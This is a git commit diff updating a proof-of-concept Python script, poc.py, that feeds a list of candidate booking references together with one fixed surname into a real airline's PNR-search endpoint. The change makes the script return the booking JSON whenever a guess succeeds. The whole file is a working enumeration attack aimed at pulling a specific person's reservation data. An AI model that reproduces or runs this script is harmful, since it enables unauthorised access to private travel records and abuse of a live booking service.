0d4c91fb928b1b91b4b47648feee1997e84e2c7e
hackberr <131232029+hackberr@users.noreply.github.com>
2023-04-19 09:51:03 +0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,7 +1,7 @@
 import aiohttp
 import asyncio
 
-async def make_request(session, pnr_no, file):
+async def make_request(session, pnr_no):
     url = 'https://web.flypgs.com/pegasus/pnr-search/filtered/secured'
     payload = {"pnrNo": pnr_no, "surname": "ASLANBAŞ", "deleteOptionalSsr": True, "filter": "MMB"}
     headers = {
@@ -18,20 +18,19 @@ async def make_request(session, pnr_no, file):
         "X-Dtpc": "35$75108566_563h19vKIIMHFPDFQURMQKFIUUETDCGMLWCRLEV-0e0"
     }
     async with session.post(url, json=payload, headers=headers) as response:
+        html_content = await response.json()
         print(f"{pnr_no} - {response.status}")
-        file.write(f"{pnr_no} - {response.status}\n")
         if response.status == 200:
-            await session.close()
-            await asyncio.sleep(1)
-            raise SystemExit
+            return await response.json()        
+        else:
+            return None
 
 async def main():
     async with aiohttp.ClientSession() as session:
         with open('output.txt', 'r') as f:
             pnr_numbers = [line.strip() for line in f.readlines()]
 
-        with open('status_codes.txt', 'w') as file:
-            for pnr_no in pnr_numbers:
-                await make_request(session, pnr_no, file)
+        for pnr_no in pnr_numbers:
+            await make_request(session, pnr_no)
 
 asyncio.run(main())
